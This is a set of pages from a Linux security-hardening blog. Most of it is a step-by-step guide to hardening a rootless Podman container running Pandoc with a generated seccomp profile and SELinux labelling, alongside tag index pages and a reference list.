31. Flatpak Team. “Under the Hood - Flatpak documentation,” flatpak.org, July 24, 2024. Accessed: August 12, 2024. [Online]. Available: [https://docs.flatpak.org/en/latest/under-the-hood.html#underlying-technologies](https://docs.flatpak.org/en/latest/under-the-hood.html#underlying-technologies) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:31)
32. “Adding parts - Snapcraft documentation,” Canonical Snapcraft, August 11, 2023. Accessed: August 12, 2024. [Online]. Available: [https://snapcraft.io/docs/adding-parts](https://snapcraft.io/docs/adding-parts) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:32)
33. Flatpak Team. “Dependencies - Flatpak documentation,” flatpak.org, July 22, 2024. Accessed: August 12, 2024. [Online]. Available: [https://docs.flatpak.org/en/latest/dependencies.html#bundling](https://docs.flatpak.org/en/latest/dependencies.html#bundling) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:33)
34. T. Dunlap, W. Enck, and B. Reaves, “A Study of Application Sandbox Policies in Linux,” in *SACMAT ‘22: Proceedings of the 27th ACM on Symposium on Access Control Models and Technologies,* 2022, pp. 19-30, doi: 10.1145/3532105.3535016. [Online]. Available: [https://dl.acm.org/doi/10.1145/3532105.3535016](https://dl.acm.org/doi/10.1145/3532105.3535016) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:34) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref1:34)
35. M. A. Lahaye. *Flatseal*. (2.2.0). Flathub. Accessed: August 18, 2024. [Online]. Available: [https://flathub.org/apps/com.github.tchx84.Flatseal](https://flathub.org/apps/com.github.tchx84.Flatseal) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:35)
36. “Firejail - Linux namespaces sandbox program,” Github repository, July 31, 2024. Accessed: August 13, 2024. [Online]. Available: [https://github.com/netblue30/firejail/blob/master/src/man/firejail.1.in](https://github.com/netblue30/firejail/blob/master/src/man/firejail.1.in) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:36)
37. “Landlock: unprivileged access control,” landlock.io. Accessed: August 19, 2024. [Online]. Available: [https://landlock.io/](https://landlock.io/) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:37)
38. M. Salaün. “Landlock: From a security mechanism idea to a widely available implementation,” landlock.io. Accessed: August 19, 2024. [Online]. Available: [https://landlock.io/talks/2024-06-06_landlock-article.pdf](https://landlock.io/talks/2024-06-06_landlock-article.pdf) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:38) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref1:38)
39. M. Salaün, Conference Presentation, Topic: “Backward and forward compatibility for security features (illustrated with Landlock),” FOSDEM, February 4, 2023. Accessed: August 13, 2024. [Online]. Available: [https://landlock.io/talks/2023-02-04_rust-landlock-fosdem.pdf](https://landlock.io/talks/2023-02-04_rust-landlock-fosdem.pdf) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:39)
40. “kernel-source/config/x86_64/default,” Github repository. Accessed: August 16, 2024. [Online]. Available: [https://github.com/openSUSE/kernel-source/blob/master/config/x86_64/default](https://github.com/openSUSE/kernel-source/blob/master/config/x86_64/default) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:40)
41. M. Salaün. “[PATCH v1 0/1] Landlock Support,” GNU Mailinglist, April 7, 2021. Accessed: August 13, 2024. [Online]. Available: [https://lists.gnu.org/archive/html/bug-tar/2021-04/msg00001.html](https://lists.gnu.org/archive/html/bug-tar/2021-04/msg00001.html) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:41)
42. “README - Landlock support,” Github repository, July 13, 2024. Accessed: August 17, 2024. [Online]. Available: [https://github.com/netblue30/firejail?tab=readme-ov-file#landlock-support](https://github.com/netblue30/firejail?tab=readme-ov-file#landlock-support) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:42)
43. M. Reeves, D. J. Tian, A. Bianchi and Z. B. Celik, “Towards Improving Container Security by Preventing Runtime Escapes,” 2021 IEEE Secure Development Conference (SecDev), Atlanta, GA, USA, 2021, pp. 38-46, doi: 10.1109/SecDev51306.2021.00022. [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:43)
44. “Templates - Qubes OS,” Qubes OS. Accessed: August 16, 2024. [Online]. Available: [https://www.qubes-os.org/doc/templates/](https://www.qubes-os.org/doc/templates/) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:44)
45. “Firecracker - Secure and fast microVMs for serverless computing,” Firecracker. Accessed: August 23, 2024. [Online]. Available: [https://firecracker-microvm.github.io/](https://firecracker-microvm.github.io/) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:45)
46. “Portal:MicroOS,” openSUSE Wiki, June 15, 2022. Accessed: August 23, 2024. [Online]. Available: [https://en.opensuse.org/Portal:MicroOS](https://en.opensuse.org/Portal:MicroOS) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:46)
47. “What is Podman?,” Red Hat, June 20, 2024. Accessed: August 16, 2024. [Online]. Available: [https://www.redhat.com/en/topics/containers/what-is-podman](https://www.redhat.com/en/topics/containers/what-is-podman) [↩︎](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review#fnref:47)

---

# sandbox

`https://hardenedlinux.org/tags/sandbox`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [GNU/Linux Sandboxing - A Brief Review](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review/)


              Aug
              20

---

# bubblewrap

`https://hardenedlinux.org/tags/bubblewrap`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [GNU/Linux Sandboxing - A Brief Review](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review/)


              Aug
              20

---

# Research

`https://hardenedlinux.org/categories/research`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2026


# [Stealthy RCE on Hardened Linux: noexec + Userland Execution PoC](https://hardenedlinux.org/blog/2026-04-13-stealthy-rce-on-hardened-linux-noexec--userland-execution-poc/)


              Apr
              13


## 2026


# [Closing the Kernel Backport Gap: Automated CVE Detection for the EU CRA (Cyber Resilience Act)](https://hardenedlinux.org/blog/2026-04-06-closing-the-kernel-backport-gap-automated-cve-detection-for-the-eu-cra-cyber-resilience-act/)


              Apr
              6


## 2025


# [The Path to Memory Safety is Inevitable](https://hardenedlinux.org/blog/2025-05-07-the-path-to-memory-safety-is-inevitable/)


              May
              7


## 2024


# [Container Hardening Process](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process/)


              Oct
              13


## 2024


# [GNU/Linux Sandboxing - A Brief Review](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review/)


              Aug
              20


## 2024


# [How to access websites hostile toward Tor through Tor](https://hardenedlinux.org/blog/2024-01-17-how-to-access-websites-hostile-toward-tor-through-tor/)


              Jan
              17


## 2023


# [Boot Unguarded: x86 Trust Anchor Downfalls to The Leaked OEM Internal Tools and Signing Keys](https://hardenedlinux.org/blog/2023-09-07-boot-unguarded-x86-trust-anchor-downfalls-to-the-leaked-oem-internal-tools-and-signing-keys/)


              Sep
              7


## 2021


# [Cheap PCB story](https://hardenedlinux.org/blog/2021-02-10-cheap-pcb-story/)


              Feb
              10


## 2020


# [OpenTitan RTL synthesis with Yosys using sv2v and RTL-to-GDS generated by OpenROAD](https://hardenedlinux.org/blog/2020-05-14-opentitan-rtl-synthesis-with-yosys-using-sv2v-and-rtl-to-gds-generated-by-openroad/)


              May
              14


## 2019


# [Demo for exploiting use-after-free in dedicated cache](https://hardenedlinux.org/blog/2019-02-20-demo-for-exploiting-use-after-free-in-dedicated-cache/)


              Feb
              20


## 2018


# [Nightmares( Meltdown/Spectre/L1TF) never goes away](https://hardenedlinux.org/blog/2018-08-16-nightmares-meltdown/spectre/l1tf-never-goes-away/)


              Aug
              16


## 2018


# [Federated XMPP with OTR (Off-the-record v3) to protect privacy for Linux user](https://hardenedlinux.org/blog/2018-02-09-federated-xmpp-with-otr-off-the-record-v3-to-protect-privacy-for-linux-user/)


              Feb
              9


## 2017


# [Exploiting on CVE-2016-6787](https://hardenedlinux.org/blog/2017-10-16-exploiting-on-cve-2016-6787/)


              Oct
              16


## 2017


# [Firmware auditing with CHIPSEC](https://hardenedlinux.org/blog/2017-07-31-firmware-auditing-with-chipsec/)


              Jul
              31


## 2017


# [Mission impossible: Hardening the x86 based core infrastructures](https://hardenedlinux.org/blog/2017-03-17-mission-impossible-hardening-the-x86-based-core-infrastructures/)


              Mar
              17


## 2016


# [Linux kernel mitigation checklist](https://hardenedlinux.org/blog/2016-12-13-linux-kernel-mitigation-checklist/)


              Dec
              13


## 2016


# [Neutralize ME firmware on SandyBridge and IvyBridge platforms](https://hardenedlinux.org/blog/2016-11-17-neutralize-me-firmware-on-sandybridge-and-ivybridge-platforms/)


              Nov
              17


## 2016


# [An Introduction to Linux Kernel Exploitation](https://hardenedlinux.org/blog/2016-01-19-an-introduction-to-linux-kernel-exploitation/)


              Jan
              19


## 2015


# [PaX/Grsecurity for Nexus 7 2013](https://hardenedlinux.org/blog/2015-05-11-pax/grsecurity-for-nexus-7-2013/)


              May
              11[apparmor](https://hardenedlinux.org/tags/apparmor)

---

# flatpak

`https://hardenedlinux.org/tags/flatpak`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [GNU/Linux Sandboxing - A Brief Review](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review/)


              Aug
              20

---

# seccomp

`https://hardenedlinux.org/tags/seccomp`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [Container Hardening Process](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process/)


              Oct
              13


## 2024


# [GNU/Linux Sandboxing - A Brief Review](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review/)


              Aug
              20[apparmor](https://hardenedlinux.org/tags/apparmor)

---

# firejail

`https://hardenedlinux.org/tags/firejail`

# HardenedLinux

char *A_small_step_in_security_hardening = "A giant leap in Free and Open source software!"; char *Long_live = "0ldsk00l!";

## 2024


# [GNU/Linux Sandboxing - A Brief Review](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review/)


              Aug
              20

---

# Container Hardening Process

`https://hardenedlinux.org/blog/2024-10-13-container-hardening-process`

**Author:** Wei **Reviewer:** Shawn Chang


**Revision:** 0.1


**Abstract:**


> *This article presents a step-by-step guide to the container hardening process on the GNU/Linux operating system. For demonstration, we create a containerized application using the Podman container platform and Pandoc. The hardening begins with creating a customized Seccomp policy profile by analyzing system calls for the container process and applying the profile. Then, MAC tools such as AppArmor and SELinux are set up on the host OS to confine the container process from arbitrarily accessing the host file system. Finally, we give some suggestions about further hardening options and some discussions about security in general.*


*Author:   Wei     
Reviewer:   Shawn Chang*

## Introduction


Thanks to the features of quickly launching and easily deploying and managing, the container technique has been broadly applied in the industry. With the help of tools such as Kubernetes, the management tasks of these container instances can reach a relatively large scale. However, it raises some questions about the security of container and containerized applications. When there is a new vulnerability, the application and its dependencies in the container may not always be updated in time, at least not as fast as the applications covered by the package management tools in an ordinary system. Furthermore, unlike the virtualization technique where the guest OS runs in the virtual machine independently, the container shares the same kernel and the process management mechanism with the host system, which potentially exposes more attack interfaces to the host and other sibling container processes. Considering this situation, further hardening targeting the container and containerized applications might be necessary to mitigate the impact of the utilization of vulnerabilities and to reduce the damage to a low level.


This article explores container hardening methods utilizing the Linux Seccomp filter and MAC tools in the host system and other means. Firstly, we select the container application, namely Podman, and set up the test environment, where we build a Pandoc container image as an example. Then, the Seccomp filter is generated using oci-seccomp-bpf-hook and applied according to the specific container instance. After that, we will see how MAC tools, including AppArmor and SELinux, are configured for container confinement.


The process presented here targets the hardening of container instances and containerized applications in the industry environment. It is not a sandbox solution, and we do not intend to implement such a solution. Although containerization can be applied as one of the sandbox confinement mechanisms, regarding a complete sandbox solution, additional restriction interfaces might be involved, and a different security perspective is considered as well. As a reference, an article that provides more information about the sandbox solutions on the GNU/Linux system [is available](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review) [1](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:1).


For the purpose of better demonstrate this process, documents including Dockerfile, Makefile, and seccomp filters have been collected and uploaded to our [git repository](https://github.com/hardenedlinux/podman-pandoc) [2](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:2).


## Build the environment


### Container Solution


First and foremost, a proper container platform is selected, is important considering that we need a hardening solution to make the exploitation more difficult.


For our environment, Podman is chosen instead of other solutions such as Docker and Linux Container. It supports the rootless container natively [3](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:3) so the container instance can be run safely by a non-root user. Also, Podman manages the container in a daemon-less way [3](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:3), which means, in contrast with Docker, no Podman management process is always running in the background. Both features reduce the attack interfaces exposed to the host.


Podman supports various commonly used container image formats, including OCI specification [4](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:4) [5](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:5) and Docker images [6](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:6). It also has a CLI user interface that is compatible with Docker, meaning that it is possible to use the same subcommands and options of the Docker interface to manage Podman containers and images.


In this process, the Podman version 5.2.2 is installed.


### OS


Here, we use OpenSUSE Tumbleweed, a rolling release distribution, as our host operating system and the system inside the container. The rolling release guarantees the applications can always get the latest updates when the patches are available. In addition, it is usually easier to apply the fix for the vulnerability on a rolling distribution compared to the fixed-term release system, which often requires some backport efforts for the fixes.


### The Appliation


For the demonstration purpose, a Pandoc container will be built. Pandoc [7](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:7) is a powerful open-source tool to convert documents between multiple formats such as markdown, markups, Open Document Format (ODF), and PDF. In the following process, a markdown document is converted to HTML for simplicity’s sake, and the output result is checked to make sure the application works as expected.


### Build and Test the Image


The Dockerfile in the git repository under `build/` shows a simple process to build the image. Only the minimized packages are included. Instead of using root, a dedicated pair of user and group `pan:pan` is created to run the application in the container.


Build the image.


```
$ podman build -t pandoc:latest build/
```


In this process, the latest update of pandoc installed in the container is in version 3.3.


Once done, check the build result.


```
$ podman images
REPOSITORY                                 TAG         IMAGE ID      CREATED             SIZE
localhost/pandoc                           latest      0c162b4e848a  About a minute ago  667 MB
registry.opensuse.org/opensuse/tumbleweed  latest      0d8c60935b25  22 hours ago        99.2 MB
```


Before hardening the container, test the image by converting a simple markdown document at `demo/demo.md` to the HTML format. Here, we map the current directory from the host to the home directory of the user that runs the Pandoc application from the container.


```
$ cd demo/
$ podman run --rm -it \
       --volume "$(pwd):/home/pan" \
       --userns keep-id:uid=$(id -u),gid=$(id -g) \
       localhost/pandoc:latest \
           pandoc -f markdown -t html demo.md -o demo.html
```


The generated markdown file `demo.md` should have contained the correct HTML format content converted from the original markdown.


So far, if everything goes well, we already have a workable image as the target of our hardening process.


## Generate Customized Seccomp Filter


Seccomp is a kernel mechanism that restricts the process from accessing some unused system calls defined by the policy. Usually, only a small set of system calls are permitted. Both Docker and Podman come with the seccomp support. If not specified explicitly, the policy from a default Seccomp profile whose location is defined in `containers.conf` is applied.


On the Tumbleweed:


```
$ grep seccomp_profile /usr/share/containers/containers.conf
#seccomp_profile = "/usr/share/containers/seccomp.json"
```


As shown, the default profile is `/usr/share/containers/seccomp.json`. However, according to the policy in this profile, 375 syscalls are allowed in total, which is overly coarse-grained for a hardening solution. Because the profile is to be used by all containers, it must include system calls as much as possible to fit all situations.


A common practice to reduce the attack interface is creating a customized policy that fits our use scenario. In other words, only the system calls that are necessary for running the above Pandoc command are included in the policy.


An unignorable problem with manually creating the Seccomp policy for an application is that it may take considerable effort and loads of time. To do so, the policy developers need to be familiar with the application, sometimes even at the code level, which is usually not practicable. For efficiency, we recommend utilizing tools to generate the Seccomp policy.


The tool oci-seccomp-bpf-hook [8](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:8) is used in our demonstration, which provides an OCI hook to trace and analyze the system calls of the container from BPF and generate a Seccomp policy profile. The package is available on major GNU/Linux distributions such as Fedora, openSUSE Tumbleweed, Debian, and Ubuntu.


### Install oci-seccomp-bpf-hook


On the openSUSE Tumbleweed, as it hasn’t been added to the official repository, we need to add the “security” development repository before installing the package. A subpackage for testing is also available so we can verify whether the tool works on the system before creating the policy profile.


```
$ sudo zypper addrepo https://download.opensuse.org/repositories/security/openSUSE_Tumbleweed/ security
$ sudo zypper install oci-seccomp-bpf-hook oci-seccomp-bpf-hook-tests
```


We plan to push the package to the factory project so that the application can be available from the official repository in the future.


The application might not be available on some distributions, but it could be built from the source code. In this case, some development libraries for the Go programming language need to be installed as dependencies.


By default, the hook’s binary is installed at `/usr/libexec/oci/hooks.d/oci-seccomp-bpf-hook`. Meanwhile, a JSON file located at `/usr/share/containers/oci/hooks.d/oci-seccomp-bpf-hook.json` defines the path to the binary, which will be passed to the command to trace the system calls later.


#### About Unprivileged BPF


Most distributions have disabled Unprivileged BPF for security considerations. Since the BPF hook is required to work with the root privilege, we don’t need to enable unprivileged BPF. Once the Seccomp profile is there, it can be used in the rootless Podman process.


### Test oci-secomp-bpf-hook


Because the test suit is also available, we could check if the BPF hook really works.


```
$ sudo /usr/share/oci-seccomp-bpf-hook/test/system/test_runner.sh
++ time bats --tap .
1..8
ok 1 Podman available
ok 2 Version check # skip This test only makes sense in a source-tree environment
ok 3 Trace and check size of generated profile
ok 4 Trace and use generated profile
ok 5 Containers fails to run blocked syscall
ok 6 Extend existing seccomp profile
ok 7 Syscall blocked in input profile remains blocked in output profile
ok 8 Trace and look for syslogs

real    0m33.802s
user    0m1.020s
sys     0m0.575s
```


The article [9](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:9) by Red Hat gives detailed instructions about the usage of oci-seccomp-bpf-hook.


### Generate the Seccomp Profile


To create the Seccomp profile, the previous command that converts between different document formats will be used, along with some additional options. The command can find `oci-seccomp-bpf-hook.json` without needing to specify its location. The option `--annotation` with the argument `io.containers.trace-syscall` is included to output the created profile. Since we run the command as root privilege and the podman image `localhost/pandoc:latest` we built has been stored in the storage of the unprivileged user, the image is invisible to the podman under the `sudo`. For this reason, the option `--root` is included.


```
$ sudo podman run --rm -it \
      --volume "$(pwd):/home/pan" \
      --userns keep-id:uid=$(id -u),gid=$(id -g) \
      --root ${HOME}/.local/share/containers/storage/ \
      --annotation io.containers.trace-syscall="of:demo_seccomp.json" \
      localhost/pandoc:latest \
          pandoc -f markdown -t html demo.md -o demo.html
```


The output Seccomp profile is in a JSON file. For consistency, change the file owner from root to the unprivileged user.


```
$ sudo chown -R $(id -un):$(id -gn) demo_seccomp.json
```


Since the command has run in root privilege on the image for the unprivileged user, the ownership of some files has been modified to the root user. We need to change it back in order to use the image as the unprivileged user.


```
$ sudo chown -R $(id -un):$(id -gn) \
      ${HOME}/.local/share/containers/storage/ \
      /tmp/storage-run-$(shell id -u)/containers/overlay-layers/mountpoints.json
```


### Apply the Profile


Since the customized Seccomp profile is ready, the next step is to run the pandoc container with this profile and see if it works in the normal operation scenario. We insert the profile into the command with the `--security-opt` option.


```
$ podman run --rm -it \
       --volume "$(pwd):/home/pan" \
       --userns keep-id:uid=$(id -u),gid=$(id -g) \
       --security-opt seccomp=demo_seccomp.json \
       localhost/pandoc:latest \
           pandoc -f markdown -t html demo.md -o demo.html
```


If everything is correct, the HTML file `demo.html` is generated, and it should be identical to the one generated previously without the hook.


### Check the Profile


Using tools like Python mjson [10](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:10), the customized Seccomp profile can be formatted for easy observation.


```
$ python3 -mjson.tool demo_seccomp.json demo_seccomp.json
```


By checking the file, we can see 73 system calls in the allow list, a small set compared to the 375 system calls from the default Seccomp profile for containers. About 80% of system calls from the default profile are blocked.


## Configure the MAC Tools for the Container


Mandatory Access Control (MAC) tools can be enabled on the host as an additional hardening layer to prevent container escape and mitigate the impact of vulnerabilities on both container platform and the application. Common used MAC tools on major GNU/Linux distributions are AppArmor and SELinux.


### AppArmor


Currently, there is an issue with using AppArmor to confine the Podman container run by the unprivileged user. When the Podman starts with the AppArmor enforcement and enables the AppArmor profile, it accesses `/sys/kernel/security/apparmor/profiles`, which require the root privilege for reading [11](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:11). Therefore, when the container is run by an unprivileged user, it fails with an error that indicates AppArmor is not enabled on the system.


For normal Podman functionality with AppArmor enforced, accessing the `profiles` pseudo file is unnecessary. A commit [12](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:12) was submitted by the community to remove the file accessing so that the AppArmor profile could work for the Podman run by the unprivileged user. However, it has been reverted [13](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:13) followingly due to the failure in the CI check procedure.


Still, it is possible to enable the AppArmor profile by running the Podman container with the root user, but the advantage of the rootless container in the hardening will be eliminated.


Another issue with AppArmor is that, so far, most distributions do not have an official workable profile for Podman, which means users have to create one manually by themselves.


For these reasons, instead of the AppArmor enforcement, SELinux is enabled in this process. We will continue monitoring the fixing progress from the Podman official repository and update our contents accordingly as necessary.


### SELinux


Since SELinux is not delivered on openSUSE Tumbleweed by default, we must install the necessary packages and enable SELinux from the configure file and kernel command line.


Instructions about configuring the kernel command line, labeling the file system, and enforcing SELinux can be found on the openSUSE wiki page at [14](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:14).


Noticed that except for the targeted policies in `selinux-policy-targeted`, the package `container-selinux` is also required which contains policies for the Podman and general containers.


```
$ sudo zypper install selinux-policy-targeted container-selinux
```


The contexts are defined at:


```
$ cat /usr/share/containers/selinux/contexts
process = "system_u:system_r:container_t:s0"
file = "system_u:object_r:container_file_t:s0"
ro_file="system_u:object_r:container_ro_file_t:s0"
kvm_process = "system_u:system_r:container_kvm_t:s0"
init_process = "system_u:system_r:container_init_t:s0"
engine_process = "system_u:system_r:container_engine_t:s0"
```


The related policies can be found at: (only part of results are shown as an example)


```
$ sudo bzcat /usr/share/selinux/packages/container.pp.bz2 | grep -ai "pod\|/container"
/usr/s?bin/containerd.*         --      system_u:object_r:container_runtime_exec_t:s0
/usr/local/s?bin/containerd.*   --      system_u:object_r:container_runtime_exec_t:s0
/usr/bin/container[^/]*plugin   --      system_u:object_r:container_runtime_exec_t:s0
/usr/bin/podman         --      system_u:object_r:container_runtime_exec_t:s0
/usr/local/bin/podman   --      system_u:object_r:container_runtime_exec_t:s0
...
/var/log/pods(/.*)?             system_u:object_r:container_log_t:s0
...
```


Now, try to run the command to convert documents again and see if it works:


```
$ cd demo/
$ podman run --rm -it \
       --volume "$(pwd):/home/pan" \
       --userns keep-id:uid=$(id -u),gid=$(id -g) \
       --security-opt seccomp=demo_seccomp.json \
       localhost/pandoc:latest \
           pandoc -f markdown -t html demo.md -o demo.html
pandoc: demo.md: withBinaryFile: permission denied (Permission denied)
```


The command failed with permission denied. It is probably because the container under SELinux does not have access permission for the mapped directory where the markdown document is.


Check the SELinux context for the directory:


```
$ cd ..
$ ls -Zd demo/
system_u:object_r:user_home_t:s0 demo/

$ ls -Z1 demo/
system_u:object_r:user_home_t:s0 demo.md
system_u:object_r:user_home_t:s0 demo_seccomp.json
system_u:object_r:user_home_t:s0 Makefile
```


It shows the labeled type of the mapped directory is `user_home_t`. However, accroding to the contexts defined at `/usr/share/containers/selinux/contexts`, the Podman process is allowed only to access the files with the type `container_file_t` labeled, thus pointing us to relabel the mapped directory and the files.


To change the context temporarily:


```
$ sudo chcon -R -t container_file_t demo/
$ ls -Zd demo/
system_u:object_r:container_file_t:s0 demo/
```


However, we want to make the change permanent so in future the label can be restored to the correct one with `restorecon`.


The following command modify the context permanently.


```
$ sudo semanage fcontext -a -t container_file_t "/home/user/podman-pandoc/demo(/.*)?"
```


Confirm our customized context has been available.


```
$ sudo semanage fcontext -C -l
SELinux fcontext                         type           Context

/home/user/podman-pandoc/demo(/.*)?      all files      system_u:object_r:container_file_t:s0
```


Finally, we relabel the directory with customized context.


```
$ sudo restorecon -R -v /absolute/path/to/demo
Relabeled /home/user/podman-pandoc/demo from unconfined_u:object_r:user_home_t:s0 to unconfined_u:object_r:container_file_t:s0
```


Run the command of converting documents again and it should work as expected.


```
$ cd demo/
$ podman run --rm -it \
       --volume "$(pwd):/home/pan" \
       --userns keep-id:uid=$(id -u),gid=$(id -g) \
       --security-opt seccomp=demo_seccomp.json \
       localhost/pandoc:latest \
           pandoc -f markdown -t html demo.md -o demo.html
```


The HTML file should have been generated successfully.


```
$ cat demo.html
```


With these efforts, we set the MAC confinement on top of the container as an additional layer of protection towards the containerized application, which works as a barrier between the container environment and the host system.


For more information about SELinux configuration and operation, refer to the Red Hat SELinux User’s and Administrator’s Guide [15](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:15) and the SELinux Portal on the openSUSE Wiki [16](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:16).


## Further Hardening Suggestions


To further harden the container runtime environment, we can enable the remote attestation based on the Linux IMA component [17](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:17) on the host. Remote attestation provides a solution for the system-wide integrity verification targeting the executables and configuration files. In our scenario, it could secure the integrity of the binary files for the Podman platform as well as the customized Seccomp policy file we created.


As a prerequisite for enabling IMA-based remote attestation, usually, a workable TPM (Trusted Platform Module) device with PCRs (Platform Configuration Registers) should be available on the host machine to protect the measurement list from being tampered with during the attack [18](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:18). Except for TPM, for the AArch64 machine with the TrustZone integrated, the remote attestation relying on TEE (Trusted Execution Environment), for instance, the OP-TEE project [19](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:19), is another possible option. Considering the nondeterminism problem [20](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:20) related to the balance of security and performance, we suggest creating a customized IMA policy to limit the attestation to a set of critical files instead of system-wide. SELinux label is supported in the IMA policy to mark the measurement files. Since the MAC solution we selected is SELinux, this approach might be the most straightforward. SMACK’s labeling system is another candidate when SELinux is not available. However, in this case, SMACK needs to be enabled on top of existing MAC tools like AppArmor, which creates a further performance burden on the system. In addition, a remote attestation solution at the production level, such as Keylime [21](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:21), is recommended. Relying on an existing mature solution, the errors and vulnerabilities that come from the development can be limited to the minimal.


Last but not least, all the above hardening solutions for the container must be based on the general OS hardening implementation, for example, maintaining compliance with the security baseline, keeping the system up to date, and managing the incidents properly and timely. Also, not only the host OS but also the system in the image should be well-hardened and maintained, which usually means the customized container image needs a rebuild when there is a vulnerability or weakness. As put by Bruce Schneier: “security is a process, not a product,” [22](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fn:22) it is essential to be aware of the risk in the specific production environment and maintain a strong defense strategy with multiple levels continuously to contend with potential attacks, especially in the network that becomes more and more hostile nowadays.


## References


---


1. “GNU/Linux Sandboxing - A Brief Review,” HardenedLinux, August 20, 2024. [Online]. Available: [https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review](https://hardenedlinux.org/blog/2024-08-20-gnu/linux-sandboxing-a-brief-review) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:1)
2. “podman-pandoc,” Github. [Online]. Available: [https://github.com/hardenedlinux/podman-pandoc](https://github.com/hardenedlinux/podman-pandoc) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:2)
3. “Podman”, Podman.io. [Online]. Available: [https://podman.io/](https://podman.io/) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:3) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref1:3)
4. “Open Container Initiative image-spec,” GitHub. Accessed: September 26, 2024. [Online]. Available: [https://github.com/opencontainers/image-spec/blob/main/spec.md](https://github.com/opencontainers/image-spec/blob/main/spec.md) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:4)
5. “Open Container Initiative,” Open Container Initiative. Accessed: September 28, 2024. [Online]. Available: [https://opencontainers.org/](https://opencontainers.org/) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:5)
6. “containers/podman,” Github Repository. [Online]. Available: [https://github.com/containers/podman](https://github.com/containers/podman) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:6)
7. “Pandoc,” Pandoc.org. [Online]. Available: [https://pandoc.org/](https://pandoc.org/) [↩︎](https://hardenedlinux.org/blog/2024-10-13-container-hardening-process#fnref:7)
